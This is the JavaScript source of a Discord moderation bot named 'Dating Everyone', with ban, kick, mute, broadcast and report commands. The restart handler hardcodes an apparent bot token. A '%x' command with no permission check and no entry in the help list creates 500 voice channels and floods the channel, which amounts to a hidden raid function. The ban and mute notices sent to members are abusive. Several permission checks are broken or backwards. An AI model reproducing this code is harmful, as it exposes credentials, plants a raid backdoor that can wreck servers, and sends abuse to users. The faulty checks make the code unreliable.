const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '%'




client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`Dating Everyone Bot | %help`,"http://twitch.tv/S-F")
  console.log('')
  console.log('') 
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});




  client.on('message',async message => {
    if(message.content.startsWith(prefix + "restart")) {
        if(message.author.id !== "348555232529219585") return message.reply('You aren\'t the bot owner.');
        message.channel.send('**Restarting.**').then(msg => {
            setTimeout(() => {
               msg.edit('**Restarting..**');
            },1000);
            setTimeout(() => {
               msg.edit('**Restarting...**');
            },2000);
        });
        console.log(`${message.author.tag} [ ${message.author.id} ] has restarted the bot.`);
        console.log(`Restarting..`);
        setTimeout(() => {
            client.destroy();
            client.login('NDU5OTEzNjIzODA5MDMyMjIz.DhvOkQ.43HL6NGV1LwBxoMRN6zp-3Khf_I');
        },3000);
    }
});
  

 


client.on('guildMemberAdd', member => {
    let channel = member.guild.channels.find('name', 'welcome-my-dear');
    let memberavatar = member.user.avatarURL
      if (!channel) return;
    let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(memberavatar)
        .addField(':running_shirt_with_sash: | name :  ',`${member}`)
        .addField(':loudspeaker: | Norther server oh my heart' , `Welcome to the server, ${member}`)
        .addField(':id: | user :', "**[" + `${member.id}` + "]**" )
                .addField('| You are the member number',`${member.guild.memberCount}`)
               
                  .addField("Name:",`<@` + `${member.id}` + `>`, true)
                     
                                     .addField(' server', `${member.guild.name}`,true)
                                       
     .setFooter("**Dating Everyone**")
        .setTimestamp()
   
      channel.sendEmbed(embed);
    });

	





client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc') {
    if (!args[1]) {
return;
}
        message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .addField(' » message : ', args)
            .setColor('#ff0000')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});


  client.on('message',function(message) {
  if (message.author.bot) return;


                  if(!message.channel.guild) return;

                    if (message.content === prefix + "members") {
 const embed = new Discord.RichEmbed()

    .setDescription(`**Members info ✨
💚 online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}
❤  dnd:       ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}
💛  idle:     ${message.guild.members.filter(m=>m.presence.status == 'idle').size}
💠   membersCount:  ${message.guild.memberCount - message.guild.members.filter(m=>m.user.bot).size}
💡 bots: ${message.guild.members.filter(m=>m.user.bot).size} **`)
         message.channel.send({embed});

    }
      });


client.on('message', function(msg) {
         var prefix = "%"
    if(msg.content.startsWith (prefix  + 'server')) {
      let embed = new Discord.RichEmbed()
      .setColor('RANDOM') 
      .setThumbnail(msg.guild.iconURL)
      .setTitle(`Showing Details Of  **${msg.guild.name}*`)
      .addField(':globe_with_meridians:** Server region**',`[** __${msg.guild.region}__ **]`,true)
      .addField(':page_facing_up: ** __Roles__**',`[** __${msg.guild.roles.size}__ **]`,true)
      .addField(':red_circle: **__ Members__**',`[** __${msg.guild.memberCount}__ **]`,true)
      .addField(':large_blue_circle: **__ Online members__**',`[** __${msg.guild.members.filter(m=>m.presence.status == 'online').size}__ **]`,true)
      .addField(':pencil:**__ Text channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'text').size}__** ]`,true)
      .addField(':microphone2:**__ Voice channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'voice').size}__ **]`,true)
      .addField(':crown:**__ Server owner__**',`**${msg.guild.owner}**`,true)
      msg.channel.send({embed:embed});
    }
  });

	  


client.on('message', function(message) {
	const myID = "348555232529219585";
    let args = message.content.split(" ").slice(1).join(" ");
    if(message.content.startsWith(prefix + "setname")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setUsername(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "stream")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setGame(args , 'https://www.twitch.tv/datingbot');
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "play")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setGame(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "listen")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'LISTENING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "watch")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'WATCHING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "setavatar")) {
				        if(message.author.id !== myID) return;
        client.user.setAvatar(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
                if(!args) return message.reply('اكتب الحالة اللي تريدها.');
           msg.delete(5000);
          message.delete(5000);
        });
    }
});
	  
	  

	  
client.on('message', message => {
    if (message.author.id === client.user.id) return;
            if (message.content.startsWith(prefix + "ping")) {
        message.channel.sendMessage(':ping_pong: Pong! In `' + `${client.ping}` + ' ms`');
    }
});	    

	  
	  
client.on('message',function(message) {
    let toKick = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + 'kick')) {
       if(!message.member.hasPermission("KICK_MEMBERS")) return message.reply('**# - You dont have enough permissions!**');
       if(toKick.bannable) return message.reply("**# - I cannot kick someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toKick.id === message.author.id) return message.reply("**# You cannot kick yourself!**")
       if(!message.guild.member(toKick).bannable) return message.reply("**# - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("You have been kicked from a server!")
       .setThumbnail(toKick.avatarURL)
       .addField("**# - Server:**",message.guild.name,true)
       .addField("**# - Reason:**",toReason,true)
       .addField("**# - Kicked By:**",message.author,true)
       if(message.member.hasPermission("KICK_MEMBERS")) return (
           toKick.sendMessage({embed: toEmbed}).then(() => message.guild.member(toKick).kick()).then(() => message.channel.send(`**Yes Ma Boy I Have Been _kicked_  ${toKick}**`))
       )
       }
});

	  
	 
	 
client.on("message", function(message) {
    let toBan = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + "ban")) {
       if(!message.member.hasPermission("BAN_MEMBERS")) return message.reply("**# - You dont have enough permissions!**");
       if(!toBan) return message.reply("**# - Mention a user!**");
       if(toBan.id === ("441924652437209090")) return message.reply("** You cannot ban me!**");
       if(toBan === message.member.guild.owner) return message.reply("** You cannot ban the owner of the server!**");
       if(toBan.bannable) return message.reply("**# - I cannot ban someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toBan.id === message.author.id) return message.reply("** You cannot ban yourself!**")
       if(!message.guild.member(toBan).bannable) return message.reply("** - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("Hello MotherFucker :wave: You Have Been Banned From ``Dating Everyone`` Go Away And Die Alone !")
       .setThumbnail(toBan.avatarURL)
       .addField("** - Server:**",message.guild.name,true)
       .addField("** - Reason:**",toReason,true)
       .addField("** - Banned By:**",message.author,true)
       if(message.member.hasPermission("BAN_MEMBERS")) return (
           toBan.sendMessage({embed: toEmbed}).then(() => message.guild.member(toBan).ban({reason: toReason})).then(() => message.channel.send(`**Yes Ma Boy I Have Been banned  ${toBan}**`))
       );
       
   }
}); 
	  


client.on('message', async message => {
  let args = message.content.split(" ");
  if(message.content.startsWith(prefix + "mute")) {
    if(!message.member.hasPermission("MANAGE_ROLES")) return message.reply('**You dont have permission  `Manage Roles`**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply('**I dont have  `Manage Roles` permission**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    let mention = message.mentions.members.first();
    if(!mention) return message.reply('**Mention the user first for give him mute**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(mention.highestRole.position >= message.guild.member(message.author).highestRole.positon) return message.reply('**You cant mute this person **').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });
    if(mention.highestRole.positon >= message.guild.member(client.user).highestRole.positon) return message.reply('**I cant mute this person **').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });
    if(mention.id === message.author.id) return message.reply('**You cant mute your self**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });


    let reason = message.content.split(" ").slice(3).join(" ");
    if(!reason) reason = "undefined";

    let thisEmbed = new Discord.RichEmbed()
    .setAuthor(mention.user.username, mention.user.avatarURL)
    .setTitle('Hi bitch u have been muted from `Dating everyone``')
    .setThumbnail(mention.user.avatarURL)
    .addField(' - You muted by',message.author,true)
    .addField(' - Reason',reason)

    let role = message.guild.roles.find('name', 'dating-mute') || message.guild.roles.get(r => r.name === 'dating-mute');
    if(!role) try {
      message.guild.createRole({
        name: "dating-mute",
        permissions: 0
      }).then(r => {
        message.guild.channels.forEach(c => {
          c.overwritePermissions(r , {
            SEND_MESSAGES: false,
            READ_MESSAGES_HISTORY: false,
            ADD_REACTIONS: false
          });
        });
      });
    } catch(e) {
      console.log(e.stack);
    }
    mention.addRole(role).then(() => {
      mention.send(thisEmbed);
      message.channel.send(`**:white_check_mark: ${mention.user.username} muted in the server ! :zipper_mouth:  **  `);
      mention.setMute(true);
    });

  } else if(message.content.startsWith(prefix + "unmute")) {
    let mention = message.mentions.members.first();
    let role = message.guild.roles.find('name', 'dating-mute') || message.guild.roles.get(r => r.name === 'dating-mute');
    if(!message.member.hasPermission("MANAGE_ROLES")) return message.reply('**You dont have permission `Manage Roles`**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply('**I dont have permission`Manage Roles` to unmute this person **').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(!mention) return message.reply('**Mention user you want to unmute him**').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

      mention.removeRole(role);
      mention.setMute(false);
      message.channel.send(`**:white_check_mark: ${mention.user.username} unmuted in the server ! :neutral_face:  **  `);
  }
});
















client.on("message", message => {
  if (message.content === "%help") {
  message.channel.send('``Check Your DMs bud  ``')
   const embed = new Discord.RichEmbed()
       .setColor('Black')
       .setFooter('By [Eriep] And [Vervolek]')
       .setThumbnail(message.author.avatarURL)
       .setDescription(`
 +[ ---------------------------- ]+
   **Administrationr Commands**
 +[ ---------------------------- ]+
 %ban    <member> <reason>   | For Ban A Member
 %kick   <member> <reason>   | For Kick A Member
 %mute   <member> <reason>   | For Mute A Member
 %unmute <member>            | For Unmute A Member
 %warn   <member> <reason>   | Warn A Memebr
 %bc1                        | For Do BroadCast
 +[ ---------------------------- ]+
         **General  Commands**
 +[ ---------------------------- ]+
 %help                       | For Sent This Message
 %report <member> <reason>   | For Report A Member
 %server                     | For See Server Stats
 %members                    | For See Members Stats

 `)
 message.author.send(embed);
}  
});








client.on('message', message => {

  if (message.content.startsWith( prefix + "report")) {
  if (!message.channel.guild) return;
  let args = message.content.split(" ").slice(1).join(' ');
  client.channels.get("406189462419144745").send(
      "\n" + "**" + " Member : " + "**" +
      "\n" + "**" + ":arrow_right:  " + message.author.tag + "**" +
      "\n" + "**" + " Reported : " + "**" +
      "\n" + "**" + args + "**")

  }
  });



  
  
  

client.on('message', message => {

    if (message.content.startsWith("back")) {        
    const embed = new Discord.RichEmbed()
        .setColor("#081070")
        .setDescription(" Welcome Back :tada:")
      message.channel.sendEmbed(embed).then(message => {message.delete(60000)});
}
});




  

  
client.on('message', message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;
  if(!message.channel.guild) return;
  if(!message.member.hasPermission('BAN_MEMBERS')) return;
  if (message.mentions.users.size < 1) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);
if (command == "warn") {
    let say = new Discord.RichEmbed()
    .setDescription(args.join("  "))
    .setColor(0x831f18)
    message.channel.sendEmbed(say);
    client.channels.get("462865002819223552").send(`**=========================================**`)
    client.channels.get("462865002819223552").send(`**New Warn !**`)
    client.channels.get("462865002819223552").send({embed : say})
    client.channels.get("462865002819223552").send(`**Admin : ${message.author.username}#${message.author.discriminator}**`)
    client.channels.get("462865002819223552").send(`**In Channel : ${message.channel}**`)
    client.channels.get("462865002819223552").send(`**==========================================**`	)
    message.delete();
  }


});





 
 

 client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'x')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('ATLANTIC GANG', 'voice')
        message.channel.send('lol');
}
}
}); 



client.on('message', message => {
    if (message.content.includes('https://discord.gg')){
    if(!message.channel.guild) return message.reply ('')
    if (!message.member.hasPermissions(['MANAGE_MESSAGES'])){
    message.channel.send('ban <@' + message.author.id + '>')
    message.delete() 
    }
    }
    if (message.content.startsWith("ban ")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply();
    var member= message.mentions.members.first();
    member.ban().then((member) => {
    message.channel.sendMessage("", {embed: {
    author: {
    },
    title: 'Reason Adversting ' + member.displayName + ' Banned',
    color: 490101,
    }
    });
    }
    ) 
    }
    });





 
 
 












client.login(process.env.BOT_TOKEN);
